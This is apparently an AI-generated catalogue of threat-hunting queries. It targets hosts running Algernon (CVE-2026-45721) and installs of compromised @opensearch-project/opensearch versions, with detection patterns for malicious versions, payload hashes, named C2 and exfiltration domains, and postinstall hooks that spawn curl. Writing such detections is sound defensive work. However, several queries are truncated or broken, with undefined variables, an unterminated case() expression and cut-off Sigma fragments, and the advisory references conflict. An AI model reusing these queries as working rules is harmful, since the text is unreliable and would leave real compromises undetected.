id: 9b7d2e5f-4a0c-4b2a-8f33-6d2e9c5d1b02

[LLM] Algernon vulnerable installation discovery (CVE-2026-45721 exposure inventory) Reconnaissance High
Hunts every host where the Algernon Go web server is installed or running so the SOC can map the blast radius of CVE-2026-45721. The bug is unauthenticated and applies to all currently-published versions until a patched release ships; identifying every algernon instance is a prerequisite to applying compensating controls (chmod 700 on parent dirs, blocking inbound traffic, or scheduled patching). Rationale: The article makes clear the bug is reachable on a stock unauth GET / against any Algernon install regardless of configuration, so the population that needs hunting is 'every host running algernon'. Two pivots — TVM software inventory and runtime ProcessRollup2/ImProcessCreate — cover both managed (TVM-onboarded) and unmanaged Linux/Windows boxes. Pulled the runtime command line so analysts can immediately read the configured --prod / web-root flag and reason about which ancestor paths are reachable. Cross-checked against: • https://github.com/xyproto/algernon • https://github.com/xyproto/algernon/releases • https://github.com/advisories/GHSA-xwcr-wm99-g9jc
ATT&CKT1190 T1592.002
Data sourcesEndpoint.Processes
// CVE-2026-45721 — discover every host with Algernon installed or running. Two pivots: TVM inventory (slower, accurate) + recent process executions (faster, covers running instances).
let TvmHits =
    DeviceTvmSoftwareInventory
    | where SoftwareName has "algernon" or SoftwareVendor =~ "xyproto"
    | project Timestamp, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, Source="TVM";
let ProcessHits =
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where FileName =~ "algernon" or FolderPath matches regex @"(?i)(^|/)algernon(\.exe)?$"
    | summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp),
                CmdLines=make_set(ProcessCommandLine, 20),
                ParentBins=make_set(InitiatingProcessFileName, 10),
                RunAsUsers=make_set(AccountName, 10)
                by DeviceId, DeviceName, FileName, SHA256
    | extend Timestamp=LastSeen, OSPlatform="unknown", SoftwareVendor="xyproto", SoftwareName="algernon", SoftwareVersion=tostring(SHA256), Source="ProcessExec"
    | project Timestamp, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, Source, FirstSeen, LastSeen, CmdLines, ParentBins, RunAsUsers;
union isfuzzy=true TvmHits, ProcessHits
| order by DeviceName asc, Timestamp desc
// CVE-2026-45721 — Sentinel exposure inventory. DeviceTvmSoftwareInventory is not in standard Sentinel; pivot via DeviceTvmSoftwareVulnerabilities (if XDR connector is on) plus ASIM ImProcessCreate for runtime evidence.
let TvmHits =
    DeviceTvmSoftwareVulnerabilities
    | where SoftwareName has "algernon" or SoftwareVendor =~ "xyproto" or CveId =~ "CVE-2026-45721"
    | project TimeGenerated, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, Source="TVM";
let ProcessHits =
    ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where ActingProcessName matches regex @"(?i)(^|/)algernon(\.exe)?$"
       or TargetProcessName matches regex @"(?i)(^|/)algernon(\.exe)?$"
    | extend AlgernonPath = iff(TargetProcessName matches regex @"(?i)algernon", TargetProcessName, ActingProcessName)
    | extend AlgernonCmd  = iff(TargetProcessName matches regex @"(?i)algernon", TargetProcessCommandLine, ActingProcessCommandLine)
    | summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated),
                CmdLines=make_set(AlgernonCmd, 20),
                RunAsUsers=make_set(ActorUsername, 10)
                by DvcHostname, AlgernonPath
    | extend TimeGenerated=LastSeen, SoftwareVendor="xyproto", SoftwareName="algernon", CveId="CVE-2026-45721", Source="ProcessExec"
    | project TimeGenerated, DeviceName=DvcHostname, SoftwareVendor, SoftwareName, AlgernonPath, CveId, Source, FirstSeen, LastSeen, CmdLines, RunAsUsers;
union isfuzzy=true TvmHits, ProcessHits
| order by DeviceName asc, TimeGenerated desc
(source:linux.auditd OR source:windows.sysmon OR source:windows.security) (@process.executable.path:(*/algernon OR *\\algernon.exe) OR @Image:(*\\algernon.exe OR *\\Algernon.exe) OR @process.name:algernon OR @process.command_line:*algernon*)
#event_simpleName=ProcessRollup2
| ImageFileName=/(\/|\\)algernon(\.exe)?$/i
| groupBy([aid, ComputerName, ImageFileName], function={ count(), min(@timestamp), max(@timestamp), collect([CommandLine, UserName, SHA256HashData]) })
ENDPOINT

DeviceTvmSoftwareVulnerabilities

DeviceTvmSoftwareVulnerabilities

[LLM] npm install of compromised @opensearch-project/opensearch versions 3.5.3/3.6.2/3.7.0/3.8.0 Delivery High
Hunts for Node.js / npm process executions that resolve, fetch, or install the four malicious tagged versions published in the 12-May-2026 force-push CI compromise. Tightest possible install-time signal — fires on the exact package@version string the advisory enumerates. Rationale: Anchors on the four exact malicious versions enumerated in the advisory and the canonical Node toolchain binaries that resolve them. Highlighting the 00:00Z-10:00Z 2026-05-12 window via InWindow distinguishes guaranteed-compromised installs from later catalogue references. Cross-checked against: • https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx
ATT&CKT1195.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("npm.exe","node.exe","yarn.exe","pnpm.exe","npx.exe","cmd.exe","powershell.exe","pwsh.exe","bash.exe")
   or FileName in~ ("npm.exe","node.exe","yarn.exe","pnpm.exe","npx.exe")
| where ProcessCommandLine has "@opensearch-project/opensearch"
     or InitiatingProcessCommandLine has "@opensearch-project/opensearch"
| extend MaliciousVersion = case(
    ProcessCommandLine has "@opensearch-project/opensearch@3.5.3" or InitiatingProcessCommandLine has "@opensearch-project/opensearch@3.5.3", "3.5.3",
    ProcessCommandLine has "@opensearch-project/opensearch@3.6.2" or InitiatingProcessCommandLine has "@opensearch-project/opensearch@3.6.2", "3.6.2",
    ProcessCommandLine has "@opensearch-project/opensearch@3.7.0" or InitiatingProcessCommandLine has "@opensearch-project/opensearch@3.7.0", "3.7.0",
    ProcessCommandLine has "@opensearch-project/opensearch@3.8.0" or InitiatingProcessCommandLine has "@opensearch-project/opensearch@3.8.0", "3.8.0",
    "unknown-version-of-affected-pkg")
| extend InWindow = Timestamp between (datetime(2026-05-12T00:00:00Z) .. datetime(2026-05-12T10:00:00Z))
| project Timestamp, DeviceName, AccountName, InWindow, MaliciousVersion, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where (NewProcessName has_any ("\\npm.exe","\\node.exe","\\yarn.exe","\\pnpm.exe","\\npx.exe") or ParentProcessName has_any ("\\npm.exe","\\node.exe","\\yarn.exe","\\pnpm.exe"))
| where CommandLine has "@opensearch-project/opensearch"
| extend MaliciousVersion = case(
    CommandLine has "@opensearch-project/opensearch@3.5.3", "3.5.3",

    CommandLine has "@opensearch-project/opensearch@3.7.0", "3.7.0",

| project TimeGenerated, Computer, Account, SubjectUserName, InWindow, MaliciousVersion, NewProcessName, CommandLine, ParentProcessName

title: Install of Compromised @opensearch-project/opensearch (Shai-Hulud-style npm push)
id: 4a6f1e2c-7b1f-4d77-9b65-7a0c4b1f1d34
description: Detects npm/yarn/pnpm/node invocations that reference the four force-push-compromised @opensearch-project/opensearch versions (3.5.3, 3.6.2, 3.7.0, 3.8.0) per GHSA-27f5-xjrr-q9ff.

            - '@opensearch-project/opensearch@3.7.0'
            - '@opensearch-project/opensearch@3.8.0'

level: critical
(source:windows.sysmon OR source:windows.security OR source:linux.auditd) (@Image:(*\\npm.exe OR *\\node.exe OR *\\yarn.exe OR *\\pnpm.exe OR *\\npx.exe OR *\\NPM.EXE OR *\\NODE.EXE) OR @process.executable.path:(*/npm OR */node OR */yarn OR */pnpm OR */npx) OR @ParentImage:(*\\npm.exe OR *\\node.exe OR *\\yarn.exe OR *\\pnpm.exe)) (@CommandLine:(*@opensearch-project/opensearch@3.5.3* OR *@opensearch-project/opensearch@3.6.2* OR *@opensearch-project/opensearch@3.7.0* OR *@opensearch-project/opensearch@3.8.0*) OR @process.command_line:(*@opensearch-project/opensearch@3.5.3* OR *@opensearch-project/opensearch@3.6.2* OR *@opensearch-project/opensearch@3.7.0* OR *@opensearch-project/opensearch@3.8.0*))
#event_simpleName=ProcessRollup2

[LLM] On-disk presence of malicious @opensearch-project/opensearch payload SHA256 Installation High
Hunts for write or open of any file whose SHA256 matches one of the three malicious artefacts shipped with the four compromised versions. Hash-based pivot catches the payload even if the package was renamed, vendored, or unzipped from a tarball off-line. Rationale: Uses the three SHA256 IOCs the GHSA enumerates — single-source on advisory but hash matches are zero-FP by construction. Pivot via DeviceFileEvents/ImFileEvent rather than IOC threat-feed correlation so it fires even when the package is unpacked from a tarball or copied from a private mirror. Cross-checked against: • https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx

[LLM] Mini Shai-Hulud / TeamPCP C2 beacon to api.masscan.cloud / git-tanstack.com / *.getsession.org Command & Control High
Detects outbound DNS or HTTP requests to the four C2 / data-exfil domains hard-coded in the compromised @opensearch-project/opensearch payload. Catches the post-install beacon even when host telemetry of the install itself was missed. Rationale: Pivots on the four article-named domains across DNS, proxy/firewall (CommonSecurityLog), ASIM DNS/web, and EDR. Sigma is skipped because the union across DNS+proxy+ASIM+web tables can't be expressed in single-event-shape Sigma. Sentinel query uses each table's actual hostname/IP columns (Computer/ClientIP on DnsEvents, DvcHostname/SrcIpAddr on ImDnsActivity, SourceHostName/SourceIP on CommonSecurityLog). Cross-checked against: • https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx • https://github.com/TanStack/router/issues/7383
ATT&CKT1071.001 T1041 T1568
Data sourcesNetwork_Resolution.DNS Web.Web Network_Traffic.All_Traffic

DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any (BadDomains)
     or tostring(parse_url(RemoteUrl).Host) in~ (BadDomains)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemoteUrl, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
let BadDomains = dynamic(["api.masscan.cloud","git-tanstack.com","filev2.getsession.org","seed1.getsession.org"]);
let DnsHits = DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name has_any (BadDomains)
    | project TimeGenerated, Host = Computer, ClientAddr = ClientIP, Domain = Name, Source = "DnsEvents";
let AsimDnsHits = ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery has_any (BadDomains)
    | project TimeGenerated, Host = DvcHostname, ClientAddr = SrcIpAddr, Domain = DnsQuery, Source = strcat("ImDnsActivity:", EventProduct);
let CslHits = CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationDnsDomain has_any (BadDomains)
        or DestinationHostName has_any (BadDomains)
        or RequestURL has_any (BadDomains)
    | project TimeGenerated, Host = SourceHostName, ClientAddr = SourceIP, Domain = coalesce(DestinationDnsDomain, DestinationHostName, RequestURL), Source = strcat("CommonSecurityLog:", DeviceVendor, ":", DeviceProduct);
let WebHits = ImWebSession
    | where TimeGenerated > ago(30d)
    | where Url has_any (BadDomains) or HttpHostName has_any (BadDomains) or DstHostname has_any (BadDomains)
    | project TimeGenerated, Host = SrcHostname, ClientAddr = SrcIpAddr, Domain = coalesce(HttpHostName, DstHostname, Url), Source = strcat("ImWebSession:", EventProduct);
union isfuzzy=true DnsHits, AsimDnsHits, CslHits, WebHits
| order by TimeGenerated desc

[LLM] Postinstall script execution from compromised @opensearch-project/opensearch package Installation Medium
Detects node child processes whose ancestor is npm/yarn/pnpm running an install/ci on the affected package — the malicious payload is delivered via a postinstall lifecycle hook that spawns shell/node/curl. Catches the active-execution moment regardless of whether the version string was logged at install time. Rationale: Targets the postinstall-hook spawn pattern that the Shai-Hulud / TanStack-router compromise pattern relies on — node/npm parent + script-host/curl child while the package path is in scope. Parent CommandLine carries the package name even when the version string isn't logged. Tagged hunting because legitimate postinstall hooks (esbuild, sharp, sqlite3) generate similar shapes — pair with UC1/UC2 for high-confidence triage. Cross-checked against: • https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx
ATT&CKT1059.007 T1546 T1195.002
